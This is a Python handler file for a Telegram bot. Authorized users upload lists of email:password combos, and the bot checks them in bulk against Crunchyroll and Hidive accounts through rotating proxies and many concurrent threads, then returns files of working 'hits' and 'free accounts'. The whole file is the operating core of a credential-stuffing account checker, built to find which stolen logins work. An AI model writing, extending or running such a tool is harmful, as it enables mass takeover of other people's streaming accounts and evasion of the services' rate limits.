"""
bot/handlers/files.py
~~~~~~~~~~~~~~~~~~~~~
Handles document uploads and the dynamic inline-keyboard UI for selecting
a processing module.

Flow
----
1. Authorized user uploads a ``.txt`` file.
2. Bot downloads it temporarily and replies with an
   :class:`InlineKeyboardMarkup` for module selection.
3. On :class:`CallbackQuery`, a unique ``task_id`` is generated, the job
   is pushed to the :class:`TaskManager`, and the message is updated with
   the queued status (including an inline **Cancel** button).
4. The worker processes each line using ``asyncio.to_thread`` with the
   ``requests``-based checker modules, throttles status edits (with a
   persistent Cancel button), and outputs positive results dynamically.
"""

from __future__ import annotations

import asyncio
import concurrent.futures
import os
import time
import uuid
from pathlib import Path
from typing import Optional

import aiofiles
from pyrogram import Client, filters
from pyrogram.errors import FloodWait, MessageNotModified
from pyrogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)

from bot.core.client import app
from bot.core.config import OWNER_ID, STATUS_INTERVAL, TEMP_DIR
from bot.database.db import is_admin, is_authorized
from bot.modules import crunchyroll as cr_mod
from bot.modules import hidive as hd_mod
from bot.modules.proxy import proxy_manager
from bot.utils.logger import setup_logger
from bot.utils.task_manager import task_manager

log = setup_logger("handlers.files")

# ── Processing-module registry ──────────────────────────────────────────
MODULES: dict[str, str] = {
    "mod_cr": "🍥 Crunchyroll",
    "mod_hd": "📺 Hidive",
}

# Maps module keys to (check_func, format_hit, format_hit_line).
_CHECKERS = {
    "mod_cr": (cr_mod.check_account, cr_mod.format_hit, cr_mod.format_hit_line),
    "mod_hd": (hd_mod.check_account, hd_mod.format_hit, hd_mod.format_hit_line),
}

# Map of pending file paths keyed by "<user_id>:<message_id>".
_pending_files: dict[str, str] = {}


# ── Helpers ─────────────────────────────────────────────────────────────

async def _is_allowed(user_id: int) -> bool:
    """Return ``True`` if the user may upload files."""
    if user_id == OWNER_ID:
        return True
    if await is_admin(user_id):
        return True
    return await is_authorized(user_id)


def _build_module_keyboard() -> InlineKeyboardMarkup:
    """Build an inline keyboard with one button per processing module."""
    buttons = [
        [InlineKeyboardButton(text=label, callback_data=key)]
        for key, label in MODULES.items()
    ]
    return InlineKeyboardMarkup(buttons)


def _build_cancel_keyboard(task_id: str) -> InlineKeyboardMarkup:
    """Build an inline keyboard with a single Cancel button."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="❌ Cancel", callback_data=f"cancel_{task_id}")]
    ])


async def _safe_edit(
    message: Message,
    text: str,
    reply_markup: Optional[InlineKeyboardMarkup] = None,
) -> None:
    """Edit a message, handling FloodWait and duplicate-text errors."""
    try:
        await message.edit_text(text, reply_markup=reply_markup)
    except FloodWait as fw:
        log.warning("FloodWait for %s s – sleeping", fw.value)
        await asyncio.sleep(fw.value)
        try:
            await message.edit_text(text, reply_markup=reply_markup)
        except (FloodWait, MessageNotModified):
            pass
    except MessageNotModified:
        pass


# ── Document upload handler ─────────────────────────────────────────────

@app.on_message(
    filters.document & filters.private & ~filters.forwarded
)
async def document_handler(_client: Client, message: Message) -> None:
    """Handle an incoming ``.txt`` document upload."""
    user_id = message.from_user.id

    if not await _is_allowed(user_id):
        return

    doc = message.document

    if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        await message.reply_text("⚠️ Please upload a `.txt` file only.")
        return

    if doc.file_size and doc.file_size > 20 * 1024 * 1024:
        await message.reply_text("⚠️ File too large. Maximum size is 20 MB.")
        return

    file_path = str(TEMP_DIR / f"{user_id}_{doc.file_name}")
    try:
        await message.download(file_name=file_path)
    except Exception:
        log.exception("Failed to download document from %s", user_id)
        await message.reply_text("❌ Failed to download your file.")
        return

    sent = await message.reply_text(
        "📂 **File received!**\nSelect a processing module:",
        reply_markup=_build_module_keyboard(),
    )
    _pending_files[f"{user_id}:{sent.id}"] = file_path
    log.info("File %s queued for module selection by %s", doc.file_name, user_id)


# ── Callback query handler (module selection) ──────────────────────────

@app.on_callback_query(filters.regex(r"^mod_"))
async def module_callback_handler(
    _client: Client, callback: CallbackQuery
) -> None:
    """Handle module selection from the inline keyboard."""
    user_id = callback.from_user.id
    msg_id = callback.message.id
    key = f"{user_id}:{msg_id}"

    file_path = _pending_files.pop(key, None)
    if file_path is None:
        await callback.answer("⚠️ Session expired. Please upload again.")
        return

    module_key = callback.data
    module_label = MODULES.get(module_key, module_key)

    # Pre-generate a task_id so it's available for the cancel button
    # and inside _process_file status messages.
    task_id = uuid.uuid4().hex[:8]

    async def _cleanup() -> None:
        try:
            os.remove(file_path)
            log.info("Cleaned up temp file %s", file_path)
        except OSError:
            pass

    task_manager.submit(
        _process_file(
            file_path=file_path,
            module_key=module_key,
            message=callback.message,
            task_id=task_id,
        ),
        cleanup=_cleanup,
        task_id=task_id,
    )

    proxy_info = f"🌐 **Proxies:** {proxy_manager.count}" if proxy_manager.count else "🌐 **Proxies:** None"
    await _safe_edit(
        callback.message,
        (
            f"⚙️ **Module:** {module_label}\n"
            f"🆔 **Task:** `{task_id}`\n"
            f"🧵 **Threads:** {proxy_manager.threads}\n"
            f"{proxy_info}\n"
            f"📌 **Status:** Queued"
        ),
        reply_markup=_build_cancel_keyboard(task_id),
    )
    await callback.answer("Task queued!")
    log.info(
        "Task %s created for module %s by user %s",
        task_id, module_key, user_id,
    )


# ── Callback query handler (cancel button) ─────────────────────────────

@app.on_callback_query(filters.regex(r"^cancel_"))
async def cancel_callback_handler(
    _client: Client, callback: CallbackQuery
) -> None:
    """Handle the inline Cancel button press."""
    task_id = callback.data.removeprefix("cancel_")

    if await task_manager.cancel(task_id):
        await callback.answer(f"🛑 Task {task_id} cancelled!")
        await _safe_edit(
            callback.message,
            f"🛑 **Task `{task_id}` cancelled.**",
        )
        log.info("Task %s cancelled via button by %s", task_id, callback.from_user.id)
    else:
        await callback.answer("Task already finished or not found.")


# ── File-processing worker ─────────────────────────────────────────────

async def _process_file(
    file_path: str,
    module_key: str,
    message: Message,
    task_id: str,
) -> None:
    """Read lines from *file_path* and process each through the selected
    module.  Uses ``asyncio.to_thread`` with a semaphore matching the
    configured thread count.
    """
    module_label = MODULES.get(module_key, module_key)
    checker = _CHECKERS.get(module_key)
    if checker is None:
        await _safe_edit(message, f"❌ Unknown module: {module_key}")
        return
    check_func, format_hit, format_hit_line = checker

    cancel_kb = _build_cancel_keyboard(task_id)
    lines: list[str] = []

    try:
        async with aiofiles.open(file_path, mode="r", encoding="utf-8",
                                 errors="replace") as f:
            lines = [
                line.strip() async for line in f if line.strip()
            ]
    except Exception:
        log.exception("Error reading file %s", file_path)
        await _safe_edit(message, "❌ Failed to read the uploaded file.")
        return

    total = len(lines)
    if total == 0:
        await _safe_edit(message, "⚠️ The uploaded file is empty.")
        return

    hits: list[dict] = []
    free_accounts: list[dict] = []
    checked = 0
    errors = 0
    free = 0
    last_edit = 0.0
    threads = proxy_manager.threads

    await _safe_edit(
        message,
        (
            f"⚙️ **Module:** {module_label}\n"
            f"🆔 **Task:** `{task_id}`\n"
            f"📌 **Status:** Processing…\n"
            f"🧵 **Threads:** {threads}\n"
            f"📊 **Progress:** 0/{total}"
        ),
        reply_markup=cancel_kb,
    )

    # Ensure the default thread-pool executor has enough workers so that
    # ``asyncio.to_thread`` can actually run ``threads`` blocking checks
    # concurrently.  Python's default executor caps at min(32, cpu+4)
    # which is far too few for 50+ threads.
    loop = asyncio.get_running_loop()
    executor = concurrent.futures.ThreadPoolExecutor(max_workers=threads)
    loop.set_default_executor(executor)

    sem = asyncio.Semaphore(threads)

    async def _check_line(line: str) -> Optional[dict]:
        """Parse and check a single email:password combo line."""
        if ":" not in line:
            return None
        email, password = line.split(":", 1)
        email = email.strip()
        password = password.strip()
        if not email or not password:
            return None
        proxy = proxy_manager.next()
        async with sem:
            return await check_func(email, password, proxy)

    async def _status_updater() -> None:
        """Periodically update the Telegram status message."""
        nonlocal last_edit
        while checked < total:
            await asyncio.sleep(STATUS_INTERVAL)
            now = time.monotonic()
            if now - last_edit >= STATUS_INTERVAL:
                last_edit = now
                await _safe_edit(
                    message,
                    (
                        f"⚙️ **Module:** {module_label}\n"
                        f"🆔 **Task:** `{task_id}`\n"
                        f"📌 **Status:** Processing…\n"
                        f"🧵 **Threads:** {threads}\n"
                        f"📊 **Progress:** {checked}/{total}\n"
                        f"✅ **Hits:** {len(hits)} | 🆓 Free: {free} | ❌ Errors: {errors}"
                    ),
                    reply_markup=cancel_kb,
                )

    # Launch the periodic status updater in the background.
    updater = asyncio.create_task(_status_updater())

    # Fire ALL tasks at once — the semaphore limits to `threads` at a
    # time.  This matches how the standalone scripts submit everything to
    # a ThreadPoolExecutor immediately instead of waiting per-batch.
    all_tasks = [asyncio.create_task(_check_line(line)) for line in lines]

    try:
        for coro in asyncio.as_completed(all_tasks):
            try:
                result = await coro
            except Exception as exc:
                errors += 1
                log.debug("Error checking line: %s", exc)
            else:
                if result is not None:
                    if result.get("free"):
                        free += 1
                        free_accounts.append(result)
                    else:
                        hits.append(result)
            checked += 1
    except asyncio.CancelledError:
        # Cancel all remaining tasks on cancellation.
        for t in all_tasks:
            if not t.done():
                t.cancel()
        await asyncio.gather(*all_tasks, return_exceptions=True)

        updater.cancel()
        try:
            await updater
        except asyncio.CancelledError:
            pass
        await _safe_edit(
            message,
            (
                f"🛑 **Cancelled**\n"
                f"⚙️ **Module:** {module_label}\n"
                f"🆔 **Task:** `{task_id}`\n"
                f"📊 **Checked:** {checked}/{total}\n"
                f"🎯 **Hits:** {len(hits)} | 🆓 Free: {free} | ❌ Errors: {errors}"
            ),
        )
        # Still send partial results before re-raising.
        await _send_results(file_path, hits, free_accounts, free, module_label, format_hit_line, message)
        raise
    finally:
        executor.shutdown(wait=False)

    # Stop the status updater.
    updater.cancel()
    try:
        await updater
    except asyncio.CancelledError:
        pass

    # ── Final summary (no cancel button) ────────────────────────────────
    hit_preview = "\n".join(
        format_hit_line(h) for h in hits[:20]
    )
    overflow = f"\n…and {len(hits) - 20} more." if len(hits) > 20 else ""

    await _safe_edit(
        message,
        (
            f"✅ **Done!**\n"
            f"⚙️ **Module:** {module_label}\n"
            f"🆔 **Task:** `{task_id}`\n"
            f"📊 **Checked:** {total}\n"
            f"🎯 **Hits:** {len(hits)} | 🆓 Free: {free} | ❌ Errors: {errors}\n\n"
            f"```\n{hit_preview}{overflow}\n```"
        ),
    )

    await _send_results(file_path, hits, free_accounts, free, module_label, format_hit_line, message)


async def _send_results(
    file_path: str,
    hits: list[dict],
    free_accounts: list[dict],
    free: int,
    module_label: str,
    format_hit_line,
    message: Message,
) -> None:
    """Save and send result files for hits and free accounts."""
    # Save hits to a results file and send it.
    if hits:
        results_path = str(
            Path(file_path).with_suffix(".results.txt")
        )
        try:
            async with aiofiles.open(results_path, "w",
                                     encoding="utf-8") as rf:
                await rf.write(
                    "\n".join(format_hit_line(h) for h in hits)
                )
            await message.reply_document(
                document=results_path,
                caption=f"🎯 {len(hits)} hits from {module_label}",
            )
        except Exception:
            log.exception("Failed to send results file")
        finally:
            try:
                os.remove(results_path)
            except OSError:
                pass

    # Save free accounts to a separate file and send it.
    if free_accounts:
        free_path = str(
            Path(file_path).with_suffix(".free.txt")
        )
        try:
            async with aiofiles.open(free_path, "w",
                                     encoding="utf-8") as ff:
                await ff.write(
                    "\n".join(
                        f"{a['email']}:{a['password']}"
                        for a in free_accounts
                    )
                )
            await message.reply_document(
                document=free_path,
                caption=f"🆓 {free} free accounts from {module_label}",
            )
        except Exception:
            log.exception("Failed to send free accounts file")
        finally:
            try:
                os.remove(free_path)
            except OSError:
                pass

    # Cleanup temp input file.
    try:
        os.remove(file_path)
    except OSError:
        pass
